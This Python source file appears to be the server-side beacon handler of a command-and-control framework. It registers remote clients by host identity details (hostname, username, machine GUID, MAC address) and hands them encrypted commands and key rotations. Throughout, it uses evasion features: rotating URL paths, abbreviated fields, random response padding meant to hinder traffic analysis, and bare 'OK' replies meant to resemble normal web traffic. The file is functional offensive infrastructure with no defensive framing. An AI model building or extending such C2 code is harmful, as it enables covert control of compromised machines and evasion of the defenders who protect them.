import logging
import json
import base64
import re
import uuid
import hashlib
import random
import string
import urllib.parse
import datetime

logger = logging.getLogger(__name__)

from handlers.base_handler import BaseHandler

class BeaconHandler(BaseHandler):
    """Handler for beacon requests from clients"""
    
    def handle(self, include_rotation_info=False):
        """
        Process a beacon request from a client
        
        Args:
            include_rotation_info: Whether to include path rotation information
        """
        self.log_message(f"Beacon received from {self.client_address[0]}")
        
        try:
            # Handle either GET or POST requests
            method = self.request_handler.command
            
            if method == "GET":
                self._handle_get_beacon(include_rotation_info)
            else:  # POST
                self._handle_post_beacon(include_rotation_info)
                
        except Exception as e:
            logger.error(f"Error handling beacon: {str(e)}")
            self.send_error_response(500, "Internal server error")
    
    def _handle_get_beacon(self, include_rotation_info=False):
        """Handle a beacon sent via GET request"""
        try:
            # Parse the query string for data and token
            query_string = self.request_handler.path.split('?', 1)[1] if '?' in self.request_handler.path else ''
            query_params = {}
            
            if query_string:
                for param in query_string.split('&'):
                    if '=' in param:
                        key, value = param.split('=', 1)
                        query_params[key] = urllib.parse.unquote(value)
            
            encrypted_data = query_params.get('d')  # Shortened from 'data'
            token = query_params.get('t', '')       # Shortened from 'token'
            is_first_contact = query_params.get('i', 'false').lower() == 'true'  # Shortened from 'init'
            client_id = query_params.get('c')       # Shortened from 'client_id' or 'id'
            
            if token:
                self.log_message(f"Received GET beacon with {len(token)} bytes of token padding")
            
            if not encrypted_data:
                self.send_error_response(400, "Missing data parameter")
                return
            
            # Process the beacon data - same for both GET and POST
            self._process_beacon_data(encrypted_data, token, include_rotation_info, client_id=client_id, is_first_contact=is_first_contact)
            
        except Exception as e:
            logger.error(f"Error handling GET beacon: {str(e)}")
            self.send_error_response(500, "Internal server error")
    
    def _handle_post_beacon(self, include_rotation_info=False):
        """Handle a beacon sent via POST request"""
        try:
            # Read content data
            content_length = int(self.headers.get('Content-Length', 0))
            if content_length == 0:
                self.send_error_response(400, "Missing content")
                return
                
            request_body = self.request_handler.rfile.read(content_length).decode('utf-8')
            
            # Parse the JSON body
            try:
                body_data = json.loads(request_body)
                encrypted_data = body_data.get('d')    # Shortened from 'data'
                
                # Extract token padding (we just need to log it)
                token = body_data.get('t', '')         # Shortened from 'token'
                is_first_contact = body_data.get('f', False)  # Shortened from 'first_contact'
                client_id = body_data.get('c')         # Shortened from 'client_id' or 'id'
                
                if token:
                    self.log_message(f"Received POST beacon with {len(token)} bytes of token padding")
                
                if not encrypted_data:
                    self.send_error_response(400, "Missing data field")
                    return
                
                # Process the beacon data - same for both GET and POST
                self._process_beacon_data(encrypted_data, token, include_rotation_info, body_data, client_id=client_id, is_first_contact=is_first_contact)
                
            except json.JSONDecodeError:
                self.send_error_response(400, "Invalid JSON format")
                return
                
        except Exception as e:
            logger.error(f"Error handling POST beacon: {str(e)}")
            self.send_error_response(500, "Internal server error")
    
    def _process_beacon_data(self, encrypted_data, token="", include_rotation_info=False, body_data=None, client_id=None, is_first_contact=False):
        """Process beacon data common to both GET and POST methods"""
        # Extract first_contact flag from body_data if available (for POST)
        rotation_id = None
        
        if body_data:
            is_first_contact = body_data.get('f', is_first_contact)  # Shortened from 'first_contact'
            rotation_id = body_data.get('r')  # Shortened from 'rotation_id'
        
        # Handle first contact scenarios
        if is_first_contact:
            # Check if we have a client_id already - this would be a reconnect scenario
            if client_id and client_id in self.client_manager.get_clients_info():
                self.log_message(f"Reconnect from known client {client_id}")
                # This is a known client reconnecting, treat as a normal connection
                is_first_contact = False
            elif not client_id:
                # Generate a new client ID for truly new connections
                client_id = self._generate_client_id()
                self.log_message(f"Handling initial contact - generated client ID: {client_id}")
                
                # Register the new client with minimal info
                client_id = self.client_manager.add_client(
                    ip=self.client_address[0],
                    hostname="Pending", 
                    username="Pending", 
                    machine_guid="Pending", 
                    os_version="Pending", 
                    mac_address="Pending", 
                    system_info={"ip": self.client_address[0]},
                    client_id=client_id
                )
                
                # Mark as new identification with first contact
                newly_identified = True
                first_contact = True
            else:
                # Client provided an ID but we don't recognize it
                # Register it as a new client with the provided ID
                self.log_message(f"New client with provided ID: {client_id}")
                self.client_manager.add_client(
                    ip=self.client_address[0],
                    hostname="Pending", 
                    username="Pending", 
                    machine_guid="Pending", 
                    os_version="Pending", 
                    mac_address="Pending", 
                    system_info={"ip": self.client_address[0]},
                    client_id=client_id
                )
                
                newly_identified = True
                first_contact = True
        else:
            # Try client_id first if provided
            if client_id and client_id in self.client_manager.get_clients_info():
                # We already know this client by ID, try to decrypt
                decrypted_data = None
                try:
                    decrypted_data = self.crypto_helper.decrypt(encrypted_data, client_id)
                    self.log_message(f"Successfully identified client {client_id} by ID and key")
                    newly_identified = False
                    first_contact = False
                except Exception as e:
                    self.log_message(f"Failed to decrypt data for known client {client_id}: {e}")
                    # Continue to try identification by key
            
            # If client_id was not provided or decryption failed, try to identify by key
            # This will be the primary identification method after secure channel is established
            if not client_id or not decrypted_data:
                client_id, decrypted_data = self.crypto_helper.identify_client_by_decryption(encrypted_data)
                
                if client_id and decrypted_data:
                    self.log_message(f"Identified client {client_id} by encryption key")
                    newly_identified = False
                    first_contact = False
            
            # Check if decryption failed
            if (client_id is None or decrypted_data is None) and not is_first_contact:
                # If we still can't identify, treat as first contact with a new client
                client_id = self._generate_client_id()
                self.log_message(f"Could not identify client by key, treating as new client: {client_id}")
                self.client_manager.add_client(
                    ip=self.client_address[0],
                    hostname="Pending", 
                    username="Pending", 
                    machine_guid="Pending", 
                    os_version="Pending", 
                    mac_address="Pending", 
                    system_info={"ip": self.client_address[0]},
                    client_id=client_id
                )
                newly_identified = True
                first_contact = True
            else:
                newly_identified = False
                first_contact = False
            
            # Parse and process the system info if we have decrypted data
            if decrypted_data and not first_contact:
                try:
                    system_info = json.loads(decrypted_data) if isinstance(decrypted_data, str) else decrypted_data
                    
                    # Update client with complete system info
                    if system_info:
                        self.client_manager.add_client(
                            ip=self.client_address[0],
                            hostname=system_info.get('Hostname', 'Unknown'),
                            username=system_info.get('Username', 'Unknown'),
                            machine_guid=system_info.get('MachineGuid', 'Unknown'),
                            os_version=system_info.get('OsVersion', 'Unknown'),
                            mac_address=system_info.get('MacAddress', 'Unknown'),
                            system_info=system_info,
                            client_id=client_id
                        )
                except (json.JSONDecodeError, TypeError):
                    self.log_message(f"Could not parse system info for client {client_id}")
                    system_info = {"Hostname": "Unknown", "IP": self.client_address[0]}
        
        # Log the beacon appropriately
        if first_contact:
            self.log_message(f"Identified client {client_id} - INITIAL CONTACT - awaiting full identification")
        else:
            hostname = "Unknown"
            try:
                client_info = self.client_manager.clients.get(client_id, {})
                hostname = client_info.get('hostname', 'Unknown')
                if hostname == "Pending":
                    hostname = client_info.get('system_info', {}).get('Hostname', 'Unknown')
            except:
                pass
            self.log_message(f"Identified client {client_id} ({hostname})")
        
        # Verify client if system info is available and not first contact
        needs_key_rotation = False
        if not first_contact:
            # Try to verify client using what we know
            system_info = {}
            try:
                # Get system info either from decrypted data or from stored client info
                if 'system_info' in locals() and system_info:
                    pass  # Already have system_info
                else:
                    client_info = self.client_manager.clients.get(client_id, {})
                    system_info = client_info.get('system_info', {})
            except:
                system_info = {}
                
            # Only attempt verification if we have some system info
            if system_info:
                _, _, needs_key_rotation, _ = self.client_helper.verify_client(client_id, system_info)
        
        # Always issue a key for first contact
        if first_contact:
            needs_key_rotation = True
        
        # Organize commands for the client
        commands, has_key_operation = self.client_helper.organize_commands(
            client_id, 
            include_key_rotation=needs_key_rotation,
            first_contact=first_contact
        )
        
        # Add system info request command after key issuance for first contact
        if first_contact and has_key_operation:
            system_info_command = {
                "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "command_type": "system_info_request",
                "args": "Requesting full system information"
            }
            commands.append(system_info_command)
            self.log_message(f"Adding system info request command for client {client_id}")
        
        # Add path rotation command if needed for established clients
        if include_rotation_info and not first_contact:
            path_rotation_command = self.path_router.create_path_rotation_command()
            commands.append(path_rotation_command)
            self.log_message(f"Sending path rotation info to client {client_id}")
        
        # Log commands being sent
        for command in commands:
            cmd_type = command['command_type']
            args = command['args'] if cmd_type not in ['key_rotation', 'key_issuance'] else '[REDACTED KEY]'
            self.client_manager.log_event(client_id, "Command sent", f"Type: {cmd_type}, Args: {args}")
        
        # Send response to client
        self._send_beacon_response(client_id, commands, has_key_operation, first_contact, include_rotation_info)
        
        # Clear key rotation commands after delivery
        if has_key_operation and not first_contact:
            self.client_helper.clear_commands_after_rotation(client_id)
    
    def _generate_client_id(self):
        """Generate a unique client ID"""
        # Create a random UUID and take the first 8 characters
        random_id = str(uuid.uuid4())[:8]
        # Return a simple string ID
        return f"client_{random_id}"
    
    def _send_beacon_response(self, client_id, commands, has_key_operation, first_contact, include_rotation_info):
        """Send the response to the client beacon"""
        # For first contact or key operations, we need to send more detailed information
        if first_contact or has_key_operation or include_rotation_info or commands:
            # Prepare response data with abbreviated field names
            response_data = {
                "com": commands,           # Shortened from "commands"
                "f": first_contact,        # Shortened from "first_contact"
                "e": False                 # Shortened from "encrypted"
            }
            
            # Only include client ID during first contact to establish identity
            if first_contact:
                response_data["c"] = client_id  # Shortened from "client_id"
            
            # Add key operation flags only if needed (with abbreviated field names)
            if has_key_operation:
                if first_contact:
                    response_data["ki"] = True  # Shortened from "key_issuance"
                else:
                    response_data["kr"] = True  # Shortened from "key_rotation"
            
            # Add path rotation info if requested (with abbreviated field name)
            if include_rotation_info:
                rotation_info = self.path_router.get_rotation_info()
                response_data["r"] = rotation_info  # Shortened from "rotation_info"
            else:
                # Only include minimal rotation info if needed
                rotation_info = {
                    "cid": self.path_router.path_manager.rotation_counter,       # Shortened from "current_rotation_id"
                    "nrt": self.path_router.path_manager.get_next_rotation_time() # Shortened from "next_rotation_time"
                }
                response_data["r"] = rotation_info
            
            # For established clients with encryption, encrypt the commands
            if not first_contact and commands:
                # Convert commands to JSON string for encryption
                commands_json = json.dumps(commands)
                
                # Encrypt the commands
                encrypted_commands = self.crypto_helper.encrypt(commands_json, client_id)
                
                # Replace commands with encrypted version
                response_data["com"] = encrypted_commands
                response_data["e"] = True
            
            # Add random padding to the response to vary payload size using 'token' field
            self._add_random_token(response_data)
            
            # Send the response as JSON
            self.send_response(200, "application/json", json.dumps(response_data))
        else:
            # For regular check-ins with no commands, just send a simple "OK" response
            # This looks more like normal web traffic
            self.send_response(200, "text/plain", "OK")
    
    def _add_random_token(self, response_data):
        """Add random padding to response using 'token' field to make traffic analysis harder"""
        # Generate a truly random length between 50 and 500 characters
        padding_length = random.randint(50, 500)
        
        # Generate random padding content
        chars = string.ascii_letters + string.digits
        padding = ''.join(random.choice(chars) for _ in range(padding_length))
        
        # Add padding to response data as 't' field (shortened from 'token')
        response_data["t"] = padding
        
        logger.debug(f"Added {padding_length} bytes of padding to response token field")